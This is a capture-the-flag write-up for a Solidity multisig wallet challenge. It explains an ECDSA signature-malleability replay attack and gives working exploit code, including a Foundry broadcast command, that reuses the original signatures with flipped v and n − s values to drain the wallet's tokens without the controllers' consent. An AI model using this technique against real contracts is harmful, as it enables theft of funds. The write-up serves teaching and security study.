# 🔐 Multisig Wallet – Medium

- **Category:** Blockchain
- **CTF Event:** Smiley CTF 2025
- **Difficulty:** Medium

> This multisig wallet lets the owners distribute a shared fund of tokens. Distribute all the tokens in the wallet without the controllers' permission.

---

## Challenge Files

- [`Locker.sol`](src/Locker.sol)
- [`Setup.sol`](src/Setup.sol)

---

## Objective

### `Setup.sol`

```solidity
function isSolved()  external view returns (bool) {
    return tokens == 0;
}
```

The main goal is to distribute the token from the multisig wallet in order to obtain the flag as we can observe the `isSolved()` function in the `Locker.sol` contract will only return `true` when the token amount is zero.

---

## Code Analysis

The challenge has given two solidity file, `Locker.sol` which includes two contract (`SetupLocker` and `Locker`), another file is `Setup.sol` which is an abstract contract used for deployment logic.

### `Locker.sol`, `Locker` contract

```solidity
// SlockDotIt ECLocker factory
contract Locker {
    uint256 public immutable lockId;
    bytes32 public immutable msgHash;
    address[] public controllers;
    uint256 public immutable threshold;
    uint256 public tokens;

    mapping(bytes32 => bool) public usedSignatures;

    constructor(
        uint256 _lockId,
        signature[] memory signatures, 
        address[] memory _controllers,
        uint256 _threshold 
    ) {
        require(
            _controllers.length >= _threshold && _threshold > 0,
            "Invalid config"
        );

        lockId = _lockId;
        threshold = _threshold;
        controllers = _controllers;
        tokens = 1;

        // Compute the expected hash
        bytes32 _msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
            mstore(0x1C, _lockId)
            _msgHash := keccak256(0x00, 0x3c)
        }
        msgHash = _msgHash;

        validateMultiSig(signatures);

        // Flatten signature arrays
        uint8[] memory vArr = new uint8[](signatures.length);
        bytes32[] memory rArr = new bytes32[](signatures.length);
        bytes32[] memory sArr = new bytes32[](signatures.length);

        for (uint256 i = 0; i < signatures.length; i++) {
            vArr[i] = signatures[i].v;
            rArr[i] = signatures[i].r;
            sArr[i] = signatures[i].s;
        }

        emit LockerDeployed(address(this), lockId, vArr, rArr, sArr, controllers, threshold);

    }

    function distribute(signature[] memory signatures) external {
        validateMultiSig(signatures);
        tokens -= 1;
    }

    function isSolved()  external view returns (bool) {
        return tokens == 0;
    }

    function validateMultiSig(signature[] memory signatures) public {
        address[] memory seen = new address[](controllers.length);
        uint256 validCount = 0;
        for (uint256 i = 0; i < signatures.length; i++){
            address recovered = _isValidSignature(signatures[i]);
            require(!_isInArray(recovered, seen), "Same signer cannot sign multiple times");

            // Ensure no duplicate
            for (uint256 j = 0; j < validCount; j++) {
                require(seen[j] != recovered, "Duplicate signer");
            }

            seen[validCount] = recovered;
            validCount++;
        }
        require(validCount == threshold, "Not enough valid signers");
    }

    function _isValidSignature(
        signature memory sig
    ) internal returns (address) {
        uint8 v = sig.v;
        bytes32 r = sig.r;
        bytes32 s = sig.s;
        address _address = ecrecover(msgHash, v, r, s);
        require(_isInArray(_address, controllers), "Signer s not a controller");

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], "Signature has already been used");
        usedSignatures[signatureHash] = true;
        return _address;
    }

    function _isInArray(address addr, address[] memory arr)
        internal
        pure
        returns (bool)
    {
        for (uint256 i = 0; i < arr.length; i++) {
            if (arr[i] == addr) return true;
        }
        return false;
    }
}
```

The Locker contract implements a multisig wallet mechanism. It is initialized with a set of controller addresses, a threshold for the number of required signatures, and a single token to be distributed. Furthermore, in the constructor, it set define the value of `msgHash` (will be used later on when recovering signer's addresses) by using Yul, it first stored `"\x19Ethereum Signed Message:\n32"` in slot `0x00` of memory, this is a prefix before the message, which follow ERC-191, Signed Data Standard. There are three version of it, version `0x00`, `0x01`, and `0x45`. In this case, it is using version `0x45`, which is the hex representation of `E`. The format of version `0x45` is:

```
0x19 <0x45 (E)> <thereum Signed Message:\n" + len(message)> <data to sign>
```

Based on the format, you will then understand why this `"\x19Ethereum Signed Message:\n32"` is being stored and will take up to 28 bytes, the `32` is stands for 32 bytes of message to sign, which is the `_lockId` stored in slot `0x1C` (slot `28`). Since the prefix takes up to 28 bytes and the message to sign take up to 32 bytes, which is a total of 60 bytes (`0x3c` in hex), it then used `keccak256(0x00, 0x3c)` for hashing both the prefix and message to sign. If you are curious for other format, you may read the ERC-191 at [here](https://eips.ethereum.org/EIPS/eip-191).

The contract enforces that only a transaction signed by the required number of unique controllers can trigger the `distribute()` function, which decrements the token count. `validateMultiSig()` checks if the signer has signed before, `_isValidSignature()` checks if the recover address is one of the controllers and also checks if the signature has been used before.


### `Locker.sol`, `SetupLocker` contract

```solidity
contract SetupLocker is Setup {
    constructor(address player_address) payable Setup(player_address) {}


    signature[] signatures;
    address[] controllers;
    function deploy() public override returns (address) {
        uint256 lockId = 0;
        signatures.push(signature({
            v: 27,
            r: 0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9,
            s: 0x6f326347e65ae8b25830beee7f3a4374f535a8f6eedb5221efba0f17eceea9a9
        }));
        signatures.push(signature({
            v: 28,
            r: 0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7,
            s: 0x694430205a6b625cc8506e945208ad32bec94583bf4ec116598708f3b65e4910
        }));
        signatures.push(signature({
            v: 27,
            r: 0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d,
            s: 0x6c0c845b7a88f5a2396d7f75b536ad577bbdb27ea8c03769a958b2a9d67117d2
        }));
        controllers.push(0x9dF23180748A2E168a24F5BBAB2a50eE38A7d309);
        controllers.push(0x8Ab87699287fe024A8b4d53385AC848930b19FfF);
        controllers.push(0x10Bab59adbDd06E90996361181b7d2129A5Eeb5A);
        uint256 threshold = 3;

        Locker _instance = new Locker(lockId, signatures, controllers, threshold);

        return address(_instance);
    }

    function isSolved() external view override returns (bool) {
        return Locker(challenge).isSolved();
    }
}
```

In this `SetupLocker` contract, we can see that how it is being deployed and what signatures are being used for signing messages.

---

## Exploitation

To exploit this, we can conduct a **Signature Malleability Replay Attack** which take the original valid signatures provided to the contract and "malleate" them for generating alternative signatures that are still valid for the same message hash but will not be detected as duplicates by the contract's logic. By constructing a new set of signatures in this way, we can satisfy the multisig threshold and call the `distribute()` function, draining the wallet's token to zero without the controllers' actual consent.

For each signature, we generate a malleated version by flipping the `v` value and computing the new `s` as `SECP256K1N - s` (`n — s`, `n` is a prime that indicates order value of the subgroup in elliptic curve points) (Ethereum and Bitcoin is using Secp256k1 curve). The `v` is indicate the parity of the signature, it should be `0` or `1`, but in the case of signing Bitcoin and Ethereum messages, 27 was added as an arbitrary number, thus making the possible value of `v` would be only `27` and `28`. `r` would not be change, you may just think it as of the x-axis position of the point, and `s` is the symmetrical parameters. I'm not going in depth into the math of ECDSA such as explaining why the `n` should be a prime. If you are curious about why and want to understand more about ECDSA like how the pair `r` and `s` are generated, you may read [here](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm).

```solidity
function run() public returns (bool) {
    signature[] memory signatures = new signature[](3);
    (uint8 v1, bytes32 r1, bytes32 s1) = malleateSignature(
        27,
        0x36ade3c84a9768d762f611fbba09f0f678c55cd73a734b330a9602b7426b18d9,
        0x6f326347e65ae8b25830beee7f3a4374f535a8f6eedb5221efba0f17eceea9a9
    );
    (uint8 v2, bytes32 r2, bytes32 s2) = malleateSignature(
        28,
        0x57f4f9e4f2ef7280c23b31c0360384113bc7aa130073c43bb8ff83d4804bd2a7,
        0x694430205a6b625cc8506e945208ad32bec94583bf4ec116598708f3b65e4910
    );
    (uint8 v3, bytes32 r3, bytes32 s3) = malleateSignature(
        27,
        0xe2e9d4367932529bf0c5c814942d2ff9ae3b5270a240be64b89f839cd4c78d5d,
        0x6c0c845b7a88f5a2396d7f75b536ad577bbdb27ea8c03769a958b2a9d67117d2
    );
    signatures[0] = signature({v: v1, r: r1, s: s1});
    signatures[1] = signature({v: v2, r: r2, s: s2});
    signatures[2] = signature({v: v3, r: r3, s: s3});

    vm.startBroadcast();
    locker.distribute(signatures);
    vm.stopBroadcast();
    return locker.isSolved();
}

uint256 constant SECP256K1N =
    0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

function malleateSignature(
    uint8 v,
    bytes32 r,
    bytes32 s
) public pure returns (uint8, bytes32, bytes32) {
    uint8 vPrime = v == 27 ? 28 : 27;
    uint256 sInt = uint256(s);
    require(sInt <= SECP256K1N, "Invalid s value");
    uint256 sPrimeInt = SECP256K1N - sInt;
    bytes32 sPrime = bytes32(sPrimeInt);
    return (vPrime, r, sPrime);
}
```

See the full exploitation script [here](script/Exploit.s.sol). Furthermore, since there was a infrastructure issue in the beginning of the event, I've created a test to validate whether my solution is working, feel free to check the test at [here](test/Exploit.t.sol) if you are interested! 

### Command to Deploy the Script

```bash
forge script script/Exploit.s.sol:Exploit --broadcast --rpc-url $RPC_URL --private-key $PK --legacy
```

You may need to add on the `--legacy` flag as RPC endpoint does not support the EIP-1559 fee methods. Furthermore, please kindly save the variables in the `.env` file. However, please don't save your private key in plaint text in production!

---